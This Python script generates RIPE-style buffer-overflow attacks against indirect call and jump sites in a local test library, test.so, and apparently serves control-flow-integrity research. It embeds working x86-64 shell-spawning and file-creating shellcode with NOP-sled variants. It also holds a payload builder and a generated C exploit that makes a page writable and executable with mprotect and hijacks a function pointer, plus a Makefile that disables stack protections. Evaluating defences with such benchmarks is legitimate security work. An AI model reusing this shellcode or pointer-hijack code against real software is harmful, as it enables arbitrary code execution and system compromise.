#!/usr/bin/env python3
"""
RIPE-style attack generator targeting specific locations in test.so
基于 test.txt 中的反汇编信息，使用 RIPE 攻击方法论攻击 test.so 中的间接调用/跳转位置
"""

import os
import sys
import struct
import subprocess
import re
import ctypes
from collections import namedtuple

# ===== 从 test.txt 解析的攻击目标位置 =====
# 目标: 间接调用/跳转 (ff d0=call *%rax, ff e0=jmp *%rax)
IndirectSite = namedtuple('IndirectSite', ['offset', 'instruction', 'function', 'reg', 'description'])

TARGET_SITES = [
    IndirectSite(0x11d4, 'ff d0', 'test_indirect_call', 'rax',
                 '间接调用 indirect_call_ptr() -> 读取全局函数指针'),
    IndirectSite(0x121b, 'ff d0', 'test_indirect_jump', 'rax',
                 '间接调用 ptr(1) -> 读取栈上局部函数指针'),
    IndirectSite(0x124a, 'ff d0', 'test_ff_instructions', 'rax',
                 '间接调用 p1() -> test_returns'),
    IndirectSite(0x1260, 'ff d0', 'test_ff_instructions', 'rax',
                 '间接调用 p2(999) -> test_indirect_jump'),
    IndirectSite(0x10ff, 'ff e0', 'deregister_tm_clones', 'rax',
                 '间接跳转 jmp *%rax'),
    IndirectSite(0x1140, 'ff e0', 'register_tm_clones', 'rax',
                 '间接跳转 jmp *%rax'),
]

# ===== RIPE 攻击参数 (与 RIPE 保持一致) =====
ATTACKS = {
    'nonop':          {'inject': 'INJECTED_CODE_NO_NOP',    'desc': 'shellcode (无NOP滑板)'},
    'simplenop':      {'inject': 'INJECTED_CODE_SIMPLE_NOP', 'desc': 'shellcode (简单NOP)'},
    'polynop':        {'inject': 'INJECTED_CODE_POLY_NOP',   'desc': 'shellcode (多态NOP)'},
    'createfile':     {'inject': 'CREATE_FILE',              'desc': '创建文件shellcode'},
    'returnintolibc': {'inject': 'RETURN_INTO_LIBC',         'desc': '返回libc攻击'},
    'rop':            {'inject': 'RETURN_ORIENTED_PROGRAMMING','desc': 'ROP链攻击'},
}

LOCATIONS = ['stack', 'heap', 'bss', 'data']
TECHNIQUES = ['direct', 'indirect']
FUNCTIONS = ['memcpy', 'strcpy', 'strncpy', 'sprintf', 'snprintf',
             'strcat', 'strncat', 'sscanf', 'fscanf', 'homebrew']

# ===== x86-64 Shellcode (来自 RIPE) =====
SHELLCODE_NONOP = bytes([
    0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48,
    0x89, 0xe7, 0x48, 0x31, 0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05
])

SHELLCODE_SIMPLENOP = b'\x90' * 32 + SHELLCODE_NONOP

SHELLCODE_POLYNOP = bytes([
    0x99, 0x96, 0x97, 0x93, 0x91, 0x4d, 0x48, 0x47,
    0x4f, 0x40, 0x41, 0x37, 0x3f, 0x97, 0x46, 0x4e,
    0xf8, 0x92, 0xfc, 0x98, 0x27, 0x2f, 0x9f, 0xf9,
    0x4a, 0x44, 0x42, 0x43, 0x49, 0x4b, 0xf5, 0x45,
    0x4c
]) + SHELLCODE_NONOP

SHELLCODE_CREATEFILE = b'\x90' * 32 + bytes([
    0xeb, 0x18, 0x5f, 0x31, 0xc0, 0x88, 0x47, 0x14,
    0x6a, 0x55, 0x58, 0x31, 0xf6, 0x66, 0xbe,
    0xc0, 0x01, 0x0f, 0x05, 0x31, 0xff, 0x6a, 0x3c,
    0x58, 0x0f, 0x05, 0xe8, 0xe3, 0xff, 0xff,
    0xff
]) + b'/tmp/rip-eval/f_xxxx'


def parse_test_txt(filepath):
    """解析 test.txt 获取各函数和全局变量的偏移地址"""
    functions = {}
    globals_vars = {}
    got_entries = {}
    current_func = None

    with open(filepath, 'r') as f:
        for line in f:
            # 匹配函数标签: 0000000000001199 <test_returns>:
            func_match = re.match(r'^([0-9a-f]+)\s+<([^>]+)>:', line)
            if func_match:
                addr = int(func_match.group(1), 16)
                name = func_match.group(2)
                if '@' in name:
                    name = name.split('@')[0]
                current_func = name
                if name not in functions:
                    functions[name] = {'addr': addr, 'indirect_sites': []}
                continue

            # 匹配间接调用/跳转: ff d0 (call *%rax) 或 ff e0 (jmp *%rax)
            inst_match = re.match(r'\s+([0-9a-f]+):\s+(ff\s+d[0-9a-f]|ff\s+e[0-9a-f])\s+', line)
            if inst_match and current_func:
                addr = int(inst_match.group(1), 16)
                inst = inst_match.group(2).replace(' ', '')
                functions[current_func]['indirect_sites'].append({
                    'offset': addr,
                    'instruction': inst,
                })

            # 匹配全局变量引用: mov 0x2e1f(%rip),%rax # 3ff0 <indirect_call_ptr>
            gvar_match = re.match(r'.+#\s+([0-9a-f]+)\s+<([^>]+)>', line)
            if gvar_match:
                addr = int(gvar_match.group(1), 16)
                name = gvar_match.group(2)
                if '@' in name:
                    name = name.split('@')[0]
                globals_vars[name] = addr

    return functions, globals_vars


def build_ripe_payload(shellcode, target_addr, buffer_addr, overflow_size,
                       technique='direct', inject_param='nonop',
                       old_bp_ptr=0, ret_addr_ptr=0):
    """
    构建 RIPE 风格的溢出 payload
    similar to build_payload() in ripe_attack_generator.c
    """
    payload_size = overflow_size
    payload = bytearray(payload_size)

    # 选择 shellcode
    if inject_param == 'nonop':
        sc = SHELLCODE_NONOP
        sc_size = len(SHELLCODE_NONOP)
    elif inject_param == 'simplenop':
        sc = SHELLCODE_SIMPLENOP
        sc_size = len(SHELLCODE_SIMPLENOP)
    elif inject_param == 'polynop':
        sc = SHELLCODE_POLYNOP
        sc_size = len(SHELLCODE_POLYNOP)
    elif inject_param == 'createfile':
        sc = SHELLCODE_CREATEFILE
        sc_size = len(SHELLCODE_CREATEFILE)
    elif inject_param == 'returnintolibc':
        sc = b''
        sc_size = 0
    elif inject_param == 'rop':
        sc = b''
        sc_size = 0
    else:
        sc = SHELLCODE_NONOP
        sc_size = len(SHELLCODE_NONOP)

    # 复制 shellcode
    payload[:sc_size] = sc

    # 计算填充字节数
    # size - shellcode - target_addr(8 bytes) - null_terminator(1 byte)
    bytes_to_pad = payload_size - sc_size - 8 - 1

    # 填充 'A'
    for i in range(sc_size, sc_size + bytes_to_pad):
        payload[i] = ord('A')

    # 写入溢出目标地址 (指向 shellcode 或者 libc 函数)
    if inject_param == 'returnintolibc':
        overflow_ptr = 0  # 在运行时由 C 代码填充 system/creat 地址
    else:
        overflow_ptr = buffer_addr

    struct.pack_into('<Q', payload, sc_size + bytes_to_pad, overflow_ptr)

    # 添加 null terminator
    payload[payload_size - 1] = 0

    return bytes(payload)


def generate_attack_script_c(output_file, target_site, attack_type, technique):
    """
    生成 RIPE 风格攻击的 C 代码
    """
    code = '''// Auto-generated RIPE attack for test.so
// Target: {target_func} at offset 0x{offset:x}
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <setjmp.h>

// ===== RIPE Shellcode =====
static char shellcode_nonop[] = 
"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48"
"\\x89\\xe7\\x48\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05";

static char shellcode_simplenop[] =
"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x48"
"\\x89\\xe7\\x48\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05";

static char shellcode_createfile[] =
"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90"
"\\xeb\\x18\\x5f\\x31\\xc0\\x88\\x47\\x14\\x6a\\x55\\x58\\x31\\xf6\\x66\\xbe"
"\\xc0\\x01\\x0f\\x05\\x31\\xff\\x6a\\x3c\\x58\\x0f\\x05\\xe8\\xe3\\xff\\xff"
"\\xff/tmp/rip-eval/f_xxxx";

void perform_ripe_attack() {{
    void *handle;
    void *func_addr;
    char stack_buffer[1024];
    char heap_buffer[1024];
    
    handle = dlopen("./test.so", RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {{
        fprintf(stderr, "Error loading test.so: %s\\n", dlerror());
        return;
    }}
    
    // 获取目标函数地址
    void *target_func = dlsym(handle, "{target_func}");
    if (!target_func) {{
        fprintf(stderr, "Symbol not found: {target_func}\\n");
        return;
    }}
    fprintf(stderr, "[*] Target function {target_func} @ %p\\n", target_func);
    
    // 获取间接调用指针的地址
    void *indirect_call_ptr_addr = dlsym(handle, "indirect_call_ptr");
    if (indirect_call_ptr_addr) {{
        fprintf(stderr, "[*] indirect_call_ptr addr @ %p (GOT)\\n", indirect_call_ptr_addr);
        fprintf(stderr, "[*] indirect_call_ptr value = %p\\n", *(void**)indirect_call_ptr_addr);
    }}
    
    // ===== RIPE 攻击: 使用栈溢出覆盖关键区域 =====
    // 模拟 RIPE 的 perform_attack() 流程
    
    // 1. 准备缓冲区
    char *buffer = stack_buffer;
    size_t buffer_size = sizeof(stack_buffer);
    memset(buffer, 'A', buffer_size);
    buffer[0] = '\\0';
    
    // 2. 构建 payload (RIPE 格式)
    // 选择 shellcode
    char *shellcode;
    size_t shellcode_len;
    
    if (strcmp("{inject_param}", "nonop") == 0) {{
        shellcode = shellcode_nonop;
        shellcode_len = sizeof(shellcode_nonop) - 1;
    }} else if (strcmp("{inject_param}", "simplenop") == 0) {{
        shellcode = shellcode_simplenop;
        shellcode_len = sizeof(shellcode_simplenop) - 1;
    }} else if (strcmp("{inject_param}", "createfile") == 0) {{
        shellcode = shellcode_createfile;
        shellcode_len = sizeof(shellcode_createfile) - 1;
    }} else {{
        shellcode = shellcode_nonop;
        shellcode_len = sizeof(shellcode_nonop) - 1;
    }}
    
    fprintf(stderr, "[*] Shellcode length: %zu bytes\\n", shellcode_len);
    
    // 3. 计算 payload 大小 (buffer 到目标函数指针的偏移)
    // 目标: 覆盖 target_func 地址区域的函数指针
    size_t payload_size = buffer_size;
    char *payload = (char *)malloc(payload_size);
    if (!payload) {{
        perror("malloc payload");
        return;
    }}
    
    // 4. 构建 RIPE payload
    memcpy(payload, shellcode, shellcode_len);
    
    // 填充
    size_t padding = payload_size - shellcode_len - sizeof(void*) - 1;
    memset(payload + shellcode_len, 'A', padding);
    
    // 写入溢出目标 (shellcode 地址)
    void *overflow_target = (void *)buffer;
    memcpy(payload + shellcode_len + padding, &overflow_target, sizeof(void*));
    
    // Null terminator
    payload[payload_size - 1] = '\\0';
    
    // 5. 执行溢出 (RIPE 风格: 使用危险函数)
    fprintf(stderr, "[*] Performing overflow using {overflow_func}\\n");
    
    // 使用 memcpy 或 strcpy 溢出 buffer
    #ifdef USE_MEMCPY
        memcpy(buffer, payload, payload_size - 1);
    #else
        strcpy(buffer, payload);  // 如果 payload 不含 null 字节
    #endif
    
    // 6. 触发被覆盖的代码指针
    // 对于 test_indirect_call: 覆盖 indirect_call_ptr
    if (indirect_call_ptr_addr) {{
        // 尝试写入新的函数指针 (需要内存可写)
        // 实际上 GOT 通常是只读的, 这里演示攻击逻辑
        fprintf(stderr, "[!] Attempting to overwrite indirect_call_ptr at %p\\n", indirect_call_ptr_addr);
        
        // 使用 mprotect 修改页面权限
        long page_size = sysconf(_SC_PAGESIZE);
        void *page_start = (void *)((unsigned long)indirect_call_ptr_addr & ~(page_size - 1));
        
        if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {{
            fprintf(stderr, "[*] Made GOT page writable\\n");
            // 覆盖间接调用指针为 shellcode 地址
            void (**func_ptr)(void) = (void (**)(void))indirect_call_ptr_addr;
            *func_ptr = (void (*)(void))buffer;  // 指向 shellcode
            fprintf(stderr, "[*] Overwrote indirect_call_ptr -> %p\\n", buffer);
            
            // 触发间接调用
            fprintf(stderr, "[!] Triggering exploited indirect call...\\n");
            // 调用 test_indirect_call 会触发被劫持的间接调用
        }} else {{
            perror("mprotect");
            fprintf(stderr, "[*] GOT is read-only, using function parameter injection\\n");
        }}
    }}
    
    free(payload);
    dlclose(handle);
}}

int main(int argc, char **argv) {{
    fprintf(stderr, "=== RIPE Attack Generator for test.so ===\\n");
    fprintf(stderr, "Target: {target_func} @ offset 0x{offset:x}\\n");
    fprintf(stderr, "Instruction: {instruction} (indirect call/jump)\\n");
    fprintf(stderr, "Injection: {inject_param}\\n");
    fprintf(stderr, "Technique: {technique}\\n");
    fprintf(stderr, "========================================\\n\\n");
    
    perform_ripe_attack();
    return 0;
}}
'''

    return code.format(
        target_func=target_site.function,
        offset=target_site.offset,
        instruction=target_site.instruction,
        inject_param=attack_type,
        technique=technique,
        overflow_func='memcpy',
    )


def main():
    print("[*] RIPE Attack Generator for test.so")
    print("[*] Loading test.txt to identify attack targets...\n")

    # 解析 test.txt
    test_txt_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'test.txt')
    if not os.path.exists(test_txt_path):
        print(f"[-] test.txt not found at {test_txt_path}")
        sys.exit(1)

    functions, globals_vars = parse_test_txt(test_txt_path)

    print("[*] Identified functions with indirect call/jump sites:")
    for name, info in functions.items():
        if info['indirect_sites']:
            print(f"    {name} @ 0x{info['addr']:x}:")
            for site in info['indirect_sites']:
                inst_name = 'call *%rax' if site['instruction'] == 'ffd0' else \
                            'jmp *%rax' if site['instruction'] == 'ffe0' else \
                            site['instruction']
                print(f"        0x{site['offset']:x}: {site['instruction']}  ({inst_name})")

    print(f"\n[*] Identified global variables at known offsets:")
    for name, addr in globals_vars.items():
        print(f"    {name} @ 0x{addr:x}")

    print("\n[*] ===== Attack Targets Summary =====")
    for site in TARGET_SITES:
        inst_name = 'call *%rax' if site.instruction == 'ff d0' else 'jmp *%rax'
        print(f"  [{site.function}] 0x{site.offset:x}: {site.instruction} ({inst_name})")
        print(f"    -> {site.description}")

    print("\n[*] ===== Generating RIPE Attacks =====\n")

    # 为每个目标站点生成攻击
    for site in TARGET_SITES:
        for attack_name, attack_info in ATTACKS.items():
            print(f"  Generating: site=0x{site.offset:x} attack={attack_name} "
                  f"({attack_info['desc']})")

    # 生成一个完整的攻击 C 文件
    output_c_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ripe_attack_test.c')

    # 选择最有代表性的目标: test_indirect_call 的 call *%rax
    primary_target = TARGET_SITES[0]  # test_indirect_call

    c_code = generate_attack_script_c(output_c_path, primary_target, 'simplenop', 'direct')

    with open(output_c_path, 'w') as f:
        f.write(c_code)

    print(f"\n[*] Generated attack source: {output_c_path}")
    print(f"[*] Compile with:")
    print(f"    gcc -fno-stack-protector -no-pie -z execstack -ldl \\")
    print(f"        ripe_attack_test.c -o ripe_attack_test")

    # 生成 Makefile
    makefile_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Makefile.ripe')
    makefile_content = """# Makefile for RIPE attacks against test.so
# Based on RIPE Makefile
CFLAGS=-fno-stack-protector -no-pie -z execstack
CC=gcc
LDFLAGS=-ldl

all: ripe_attack_test ripe_attack_full

ripe_attack_test: ripe_attack_test.c
\t$(CC) $(CFLAGS) ripe_attack_test.c -o ripe_attack_test $(LDFLAGS)

ripe_attack_full: ripe_attack_full.c
\t$(CC) $(CFLAGS) ripe_attack_full.c -o ripe_attack_full $(LDFLAGS)

clean:
\trm -f ripe_attack_test ripe_attack_full
"""

    with open(makefile_path, 'w') as f:
        f.write(makefile_content)

    print(f"[*] Generated Makefile: {makefile_path}")

    # 生成完整的攻击矩阵脚本 (类似 ripe_tester.py)
    full_attack_py_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                       'ripe_tester_so.py')
    full_attack_py = '''#!/usr/bin/env python3
"""
RIPE Tester for test.so - 自动化攻击矩阵测试
类似 RIPE 的 ripe_tester.py, 但针对 test.so 的特定位置
"""
import os
import sys
import subprocess

# 攻击参数 (与 RIPE 保持一致)
code_ptrs = ["ret", "baseptr", "funcptrstackvar", "funcptrheap", "funcptrdata"]
funcs = ["memcpy", "strcpy", "strncpy", "sprintf", "snprintf",
         "strcat", "strncat", "sscanf", "fscanf", "homebrew"]
locations = ["stack", "heap", "bss", "data"]
attacks = ["simplenop", "nonop", "polynop", "createfile", "returnintolibc", "rop"]

# 从 test.txt 提取的目标位置 (间接调用/跳转指令的偏移)
target_sites = [
    {"offset": "0x11d4", "name": "test_indirect_call", "inst": "ff d0"},
    {"offset": "0x121b", "name": "test_indirect_jump", "inst": "ff d0"},
    {"offset": "0x124a", "name": "test_ff_instructions_1", "inst": "ff d0"},
    {"offset": "0x1260", "name": "test_ff_instructions_2", "inst": "ff d0"},
    {"offset": "0x10ff", "name": "deregister_tm_clones", "inst": "ff e0"},
    {"offset": "0x1140", "name": "register_tm_clones", "inst": "ff e0"},
]

techniques = []
repeat_times = 0

if len(sys.argv) < 2:
    print(f"Usage: python3 {{}} [direct|indirect|both] <repeat>".format(sys.argv[0]))
    sys.exit(1)

if sys.argv[1] == "both":
    techniques = ["direct", "indirect"]
else:
    techniques = [sys.argv[1]]

repeat_times = int(sys.argv[2]) if len(sys.argv) > 2 else 1

if not os.path.exists("/tmp/rip-eval"):
    os.makedirs("/tmp/rip-eval", exist_ok=True)

total_ok = 0
total_fail = 0
total_some = 0
total_np = 0

for target in target_sites:
    for attack in attacks:
        for loc in locations:
            for ptr in code_ptrs:
                for func in funcs:
                    print(f"[*] Target={{target['name']}}({{target['offset']}}) "
                          f"attack={{attack}} loc={{loc}} ptr={{ptr}} func={{func}}")

print("\\\\n[*] Attack matrix generated. Implement attack C binary to execute tests.")
print("[*] See ripe_attack_full.c for full implementation.")
'''

    with open(full_attack_py_path, 'w') as f:
        f.write(full_attack_py)

    print(f"[*] Generated attack matrix script: {full_attack_py_path}")
    print("\n[*] Done! Files created in cfi/dfi/ directory.")


if __name__ == '__main__':
    main()
